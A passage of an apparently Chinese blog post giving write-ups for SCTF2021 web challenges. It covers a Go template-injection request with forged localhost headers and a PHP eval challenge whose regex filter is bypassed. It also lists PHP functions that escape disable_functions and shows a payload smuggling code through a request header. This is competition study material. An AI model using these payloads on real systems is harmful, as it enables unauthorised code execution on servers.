<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="FUMO_on_the_Christmas_treeast抽象语法树分析pop链 正则匹配 2021强网杯popmaster相似题目 GOFTP暂无 Loginme12345678910111213141516171819202122232425262728GET &#x2F;admin&#x2F;index?id&#x3D;4&amp;age&#x3D;&amp;#123;&amp;#123;.&amp;#125;&amp;#125; HTTP&#x2F;1.1Host: 1">
<meta property="og:type" content="article">
<meta property="og:title" content="SCTF2021WEB">
<meta property="og:url" content="https://tefuir72.github.io/2021/12/26/2021122621/index.html">
<meta property="og:site_name" content="TeFuir&#39;Blog">
<meta property="og:description" content="FUMO_on_the_Christmas_treeast抽象语法树分析pop链 正则匹配 2021强网杯popmaster相似题目 GOFTP暂无 Loginme12345678910111213141516171819202122232425262728GET &#x2F;admin&#x2F;index?id&#x3D;4&amp;age&#x3D;&amp;#123;&amp;#123;.&amp;#125;&amp;#125; HTTP&#x2F;1.1Host: 1">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://tefuir72.github.io/2021/12/26/2021122621/2021122621/image-20211227151928032.png">
<meta property="og:image" content="https://tefuir72.github.io/2021/12/26/2021122621/2021122621/image-20211227155908367.png">
<meta property="og:image" content="https://tefuir72.github.io/2021/12/26/2021122621/2021122621/image-20211228130236802.png">
<meta property="og:image" content="https://tefuir72.github.io/2021/12/26/2021122621/2021122621/image-20220103112050066.png">
<meta property="og:image" content="https://tefuir72.github.io/2021/12/26/2021122621/2021122621/image-20220103112550814.png">
<meta property="og:image" content="https://tefuir72.github.io/2021/12/26/2021122621/2021122621/image-20211229125505518.png">
<meta property="og:image" content="https://tefuir72.github.io/2021/12/26/2021122621/2021122621/image-20211231233538503.png">
<meta property="og:image" content="https://tefuir72.github.io/2021/12/26/2021122621/2021122621/image-20211228220201763.png">
<meta property="og:image" content="https://tefuir72.github.io/2021/12/26/2021122621/2021122621/image-20211228221436125.png">
<meta property="og:image" content="https://tefuir72.github.io/2021/12/26/2021122621/2021122621/image-20211229123816928.png">
<meta property="og:image" content="https://tefuir72.github.io/2021/12/26/2021122621/2021122621/image-20211229123403488.png">
<meta property="og:image" content="https://tefuir72.github.io/2021/12/26/2021122621/2021122621/image-20211229124319616.png">
<meta property="og:image" content="https://tefuir72.github.io/2021/12/26/2021122621/2021122621/image-20211229124344527.png">
<meta property="og:image" content="https://tefuir72.github.io/2021/12/26/2021122621/2021122621/image-20220103212325315.png">
<meta property="og:image" content="https://tefuir72.github.io/2021/12/26/2021122621/2021122621/image-20220103212446155.png">
<meta property="og:image" content="https://tefuir72.github.io/2021/12/26/2021122621/2021122621/image-20220103212510386.png">
<meta property="article:published_time" content="2021-12-26T13:12:59.000Z">
<meta property="article:modified_time" content="2022-01-03T13:29:14.256Z">
<meta property="article:author" content="Te Fuir">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://tefuir72.github.io/2021/12/26/2021122621/2021122621/image-20211227151928032.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>SCTF2021WEB</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/links/">links</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post " href="/2022/03/02/2022030209/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post " href="/2021/12/24/2021122421/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tefuir72.github.io/2021/12/26/2021122621/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tefuir72.github.io/2021/12/26/2021122621/&text=SCTF2021WEB"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tefuir72.github.io/2021/12/26/2021122621/&title=SCTF2021WEB"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tefuir72.github.io/2021/12/26/2021122621/&is_video=false&description=SCTF2021WEB"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SCTF2021WEB&body=Check out this article: https://tefuir72.github.io/2021/12/26/2021122621/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tefuir72.github.io/2021/12/26/2021122621/&title=SCTF2021WEB"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tefuir72.github.io/2021/12/26/2021122621/&title=SCTF2021WEB"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tefuir72.github.io/2021/12/26/2021122621/&title=SCTF2021WEB"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tefuir72.github.io/2021/12/26/2021122621/&title=SCTF2021WEB"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tefuir72.github.io/2021/12/26/2021122621/&name=SCTF2021WEB&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://tefuir72.github.io/2021/12/26/2021122621/&t=SCTF2021WEB"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#FUMO-on-the-Christmas-tree"><span class="toc-number">1.</span> <span class="toc-text">FUMO_on_the_Christmas_tree</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GOFTP"><span class="toc-number">2.</span> <span class="toc-text">GOFTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Loginme"><span class="toc-number">3.</span> <span class="toc-text">Loginme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rceme"><span class="toc-number">4.</span> <span class="toc-text">Rceme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Upload-it"><span class="toc-number">5.</span> <span class="toc-text">Upload_it</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Upload-it2"><span class="toc-number">6.</span> <span class="toc-text">Upload_it2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezosu"><span class="toc-number">7.</span> <span class="toc-text">ezosu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">8.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        SCTF2021WEB
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Te Fuir</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-12-26T13:12:59.000Z" itemprop="datePublished">2021-12-26</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/ctf/" rel="tag">ctf</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="FUMO-on-the-Christmas-tree"><a href="#FUMO-on-the-Christmas-tree" class="headerlink" title="FUMO_on_the_Christmas_tree"></a>FUMO_on_the_Christmas_tree</h2><p>ast抽象语法树分析pop链</p>
<p>正则匹配</p>
<p>2021强网杯popmaster相似题目</p>
<h2 id="GOFTP"><a href="#GOFTP" class="headerlink" title="GOFTP"></a>GOFTP</h2><p>暂无</p>
<h2 id="Loginme"><a href="#Loginme" class="headerlink" title="Loginme"></a>Loginme</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">GET /admin/index?id=4&amp;age=&#123;&#123;.&#125;&#125; HTTP/1.1</span><br><span class="line">Host: 124.71.166.197:18001</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded:127.0.0.1</span><br><span class="line">Forwarded-For:127.0.0.1</span><br><span class="line">Forwarded:127.0.0.1</span><br><span class="line">X-Forwarded-Host:127.0.0.1</span><br><span class="line">X-remote-IP:127.0.0.1</span><br><span class="line">X-remote-addr:127.0.0.1</span><br><span class="line">True-Client-IP:127.0.0.1</span><br><span class="line">Client-IP:127.0.0.1</span><br><span class="line">X-Real-IP:127.0.0.1</span><br><span class="line">Ali-CDN-Real-IP:127.0.0.1</span><br><span class="line">Cdn-Src-Ip:127.0.0.1</span><br><span class="line">Cdn-Real-Ip:127.0.0.1</span><br><span class="line">CF-Connecting-IP:127.0.0.1</span><br><span class="line">X-Cluster-Client-IP:127.0.0.1</span><br><span class="line">WL-Proxy-Client-IP:127.0.0.1</span><br><span class="line">Proxy-Client-IP:127.0.0.1</span><br><span class="line">Fastly-Client-Ip:127.0.0.1</span><br><span class="line">True-Client-Ip:127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>go模板注入</p>
<h2 id="Rceme"><a href="#Rceme" class="headerlink" title="Rceme"></a>Rceme</h2><p>题目源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Try harder!\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    var_dump(ini_get(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>可以看到正则并没有禁了可见字符以及常见符号</p>
<p>没有禁<code>%![]~</code>,这里可以用取反来绕过正则</p>
<p>第二条正则可以看到是常见的无参rce</p>
<p>最后要绕过disable_function</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><span class="line"># 这里记录一下可供命令执行的函数</span><br><span class="line"># php -r &quot;print_r(get_defined_functions());&quot; //获得所有定义函数,再比对</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gc_status</span><br><span class="line">openssl_pkey_derive</span><br><span class="line">sodium_crypto_aead_aes256gcm_decrypt</span><br><span class="line">sodium_crypto_aead_aes256gcm_keygen</span><br><span class="line">sodium_crypto_aead_chacha20poly1305_encrypt</span><br><span class="line">sodium_crypto_aead_chacha20poly1305_ietf_decrypt</span><br><span class="line">sodium_crypto_aead_chacha20poly1305_ietf_keygen</span><br><span class="line">sodium_crypto_aead_xchacha20poly1305_ietf_keygen</span><br><span class="line">sodium_crypto_auth</span><br><span class="line">sodium_crypto_auth_verify</span><br><span class="line">sodium_crypto_box_keypair</span><br><span class="line">sodium_crypto_box_keypair_from_secretkey_and_publickey</span><br><span class="line">sodium_crypto_box_publickey</span><br><span class="line">sodium_crypto_box_seal</span><br><span class="line">sodium_crypto_box_secretkey</span><br><span class="line">sodium_crypto_kx_publickey</span><br><span class="line">sodium_crypto_kx_seed_keypair</span><br><span class="line">sodium_crypto_kx_server_session_keys</span><br><span class="line">sodium_crypto_generichash_keygen</span><br><span class="line">sodium_crypto_generichash_update</span><br><span class="line">sodium_crypto_kdf_derive_from_key</span><br><span class="line">sodium_crypto_pwhash</span><br><span class="line">sodium_crypto_pwhash_str_verify</span><br><span class="line">sodium_crypto_pwhash_scryptsalsa208sha256</span><br><span class="line">sodium_crypto_pwhash_scryptsalsa208sha256_str_verify</span><br><span class="line">sodium_crypto_secretbox</span><br><span class="line">sodium_crypto_secretbox_open</span><br><span class="line">sodium_crypto_secretstream_xchacha20poly1305_init_push</span><br><span class="line">sodium_crypto_secretstream_xchacha20poly1305_init_pull</span><br><span class="line">sodium_crypto_secretstream_xchacha20poly1305_rekey</span><br><span class="line">sodium_crypto_shorthash_keygen</span><br><span class="line">sodium_crypto_sign_detached</span><br><span class="line">sodium_crypto_sign_ed25519_sk_to_curve25519</span><br><span class="line">sodium_crypto_sign_keypair_from_secretkey_and_publickey</span><br><span class="line">sodium_crypto_sign_publickey</span><br><span class="line">sodium_crypto_sign_publickey_from_secretkey</span><br><span class="line">sodium_crypto_sign_verify_detached</span><br><span class="line">sodium_crypto_stream_keygen</span><br><span class="line">sodium_add</span><br><span class="line">sodium_increment</span><br><span class="line">sodium_memzero</span><br><span class="line">sodium_unpad</span><br><span class="line">sodium_hex2bin</span><br><span class="line">sodium_base642bin</span><br><span class="line">strptime</span><br><span class="line">nl_langinfo</span><br><span class="line">sys_getloadavg</span><br><span class="line">net_get_interfaces</span><br><span class="line">lchown</span><br><span class="line">array_key_first</span><br><span class="line">apache_lookup_uri</span><br><span class="line">apache_getenv</span><br><span class="line">apache_get_version</span><br><span class="line">xxhash32</span><br><span class="line">exif_read_data</span><br><span class="line">exif_tagname</span><br><span class="line">exif_imagetype</span><br><span class="line">gettext</span><br><span class="line">dgettext</span><br><span class="line">bindtextdomain</span><br><span class="line">dngettext</span><br><span class="line">bind_textdomain_codeset</span><br><span class="line">gmp_import</span><br><span class="line">gmp_intval</span><br><span class="line">gmp_add</span><br><span class="line">gmp_mul</span><br><span class="line">gmp_div_q</span><br><span class="line">gmp_div</span><br><span class="line">gmp_divexact</span><br><span class="line">gmp_abs</span><br><span class="line">gmp_sqrt</span><br><span class="line">gmp_root</span><br><span class="line">gmp_pow</span><br><span class="line">gmp_perfect_square</span><br><span class="line">gmp_prob_prime</span><br><span class="line">gmp_gcdext</span><br><span class="line">gmp_invert</span><br><span class="line">gmp_legendre</span><br><span class="line">gmp_cmp</span><br><span class="line">gmp_random</span><br><span class="line">gmp_random_bits</span><br><span class="line">gmp_and</span><br><span class="line">gmp_com</span><br><span class="line">gmp_setbit</span><br><span class="line">gmp_testbit</span><br><span class="line">gmp_scan1</span><br><span class="line">gmp_hamdist</span><br><span class="line">gmp_binomial</span><br><span class="line">posix_kill</span><br><span class="line">posix_getppid</span><br><span class="line">posix_setuid</span><br><span class="line">posix_seteuid</span><br><span class="line">posix_setgid</span><br><span class="line">posix_setegid</span><br><span class="line">posix_getlogin</span><br><span class="line">posix_setsid</span><br><span class="line">posix_getpgid</span><br><span class="line">posix_uname</span><br><span class="line">posix_ctermid</span><br><span class="line">posix_isatty</span><br><span class="line">posix_mkfifo</span><br><span class="line">posix_access</span><br><span class="line">posix_getgrgid</span><br><span class="line">posix_getpwuid</span><br><span class="line">posix_setrlimit</span><br><span class="line">posix_errno</span><br><span class="line">posix_initgroups</span><br><span class="line">readline_callback_handler_install</span><br><span class="line">readline_callback_handler_remove</span><br><span class="line">readline_on_new_line</span><br><span class="line">shmop_read</span><br><span class="line">shmop_size</span><br><span class="line">shmop_delete</span><br><span class="line">socket_create</span><br><span class="line">socket_create_pair</span><br><span class="line">socket_set_nonblock</span><br><span class="line">socket_listen</span><br><span class="line">socket_write</span><br><span class="line">socket_getsockname</span><br><span class="line">socket_connect</span><br><span class="line">socket_bind</span><br><span class="line">socket_send</span><br><span class="line">socket_sendto</span><br><span class="line">socket_set_option</span><br><span class="line">socket_last_error</span><br><span class="line">socket_import_stream</span><br><span class="line">socket_sendmsg</span><br><span class="line">socket_cmsg_space</span><br><span class="line">socket_addrinfo_connect</span><br><span class="line">socket_addrinfo_explain</span><br><span class="line">socket_setopt</span><br><span class="line">msg_send</span><br><span class="line">msg_remove_queue</span><br><span class="line">msg_set_queue</span><br><span class="line">sem_get</span><br><span class="line">sem_release</span><br><span class="line">shm_attach</span><br><span class="line">shm_detach</span><br><span class="line">shm_has_var</span><br><span class="line">shm_remove_var</span><br><span class="line">opcache_invalidate</span><br><span class="line">opcache_is_script_cached</span><br><span class="line">opcache_get_status</span><br><span class="line">imap_open</span><br><span class="line">strlen</span><br><span class="line">error_reporting</span><br><span class="line">set_error_handler</span><br><span class="line">create_function</span><br><span class="line">bcadd</span><br><span class="line">bcsub</span><br><span class="line">bcmul</span><br><span class="line">bcdiv</span><br><span class="line">bcmod</span><br><span class="line">bcpow</span><br><span class="line">bcsqrt</span><br><span class="line">bcscale</span><br><span class="line">bccomp</span><br><span class="line">bcpowmod</span><br><span class="line">preg_match</span><br><span class="line">preg_replace</span><br><span class="line">phpinfo</span><br><span class="line">strstr</span><br><span class="line">escapeshellarg</span><br><span class="line">getenv</span><br><span class="line">putenv</span><br><span class="line">call_user_func</span><br><span class="line">unserialize</span><br><span class="line">var_dump</span><br><span class="line">highlight_file</span><br><span class="line">show_source</span><br><span class="line">ini_get</span><br><span class="line">sapi_windows_vt100_support</span><br><span class="line">end</span><br><span class="line">sapi_windows_cp_set</span><br><span class="line">sapi_windows_cp_get</span><br><span class="line">sapi_windows_cp_is_utf8</span><br><span class="line">sapi_windows_cp_conv</span><br><span class="line">wddx_serialize_value</span><br><span class="line">wddx_serialize_vars</span><br><span class="line">wddx_packet_start</span><br><span class="line">wddx_packet_end</span><br><span class="line">wddx_add_vars</span><br><span class="line">wddx_deserialize</span><br><span class="line">apache_child_terminate</span><br><span class="line">getallheaders</span><br><span class="line">curl_init</span><br><span class="line">curl_copy_handle</span><br><span class="line">curl_version</span><br><span class="line">curl_setopt</span><br><span class="line">curl_setopt_array</span><br><span class="line">curl_exec</span><br><span class="line">curl_getinfo</span><br><span class="line">curl_error</span><br><span class="line">curl_errno</span><br><span class="line">curl_close</span><br><span class="line">curl_strerror</span><br><span class="line">curl_multi_strerror</span><br><span class="line">curl_share_strerror</span><br><span class="line">curl_reset</span><br><span class="line">curl_escape</span><br><span class="line">curl_unescape</span><br><span class="line">curl_pause</span><br><span class="line">curl_multi_init</span><br><span class="line">curl_multi_add_handle</span><br><span class="line">curl_multi_remove_handle</span><br><span class="line">curl_multi_select</span><br><span class="line">curl_multi_exec</span><br><span class="line">curl_multi_getcontent</span><br><span class="line">curl_multi_info_read</span><br><span class="line">curl_multi_close</span><br><span class="line">curl_multi_errno</span><br><span class="line">curl_multi_setopt</span><br><span class="line">curl_share_init</span><br><span class="line">curl_share_close</span><br><span class="line">curl_share_setopt</span><br><span class="line">curl_share_errno</span><br><span class="line">curl_file_create</span><br><span class="line">imagegrabwindow</span><br><span class="line">imagegrabscreen</span><br></pre></td></tr></table></figure>



<p>先看无参rce,构造payload</p>
<p><img src="2021122621/image-20211227151928032.png" alt="image-20211227151928032"></p>
<p>这里getallheaders()函数并没有被禁,可以使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getallheaders返回当前请求的所有请求头信息数组</span><br></pre></td></tr></table></figure>

<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 一般运用</span><br><span class="line">POST:</span><br><span class="line">cmd=eval(end(getallheaders()));</span><br><span class="line"></span><br><span class="line">HTTP:</span><br><span class="line">evil: phpinfo();</span><br></pre></td></tr></table></figure>



<p>getenv()也没有被禁</p>
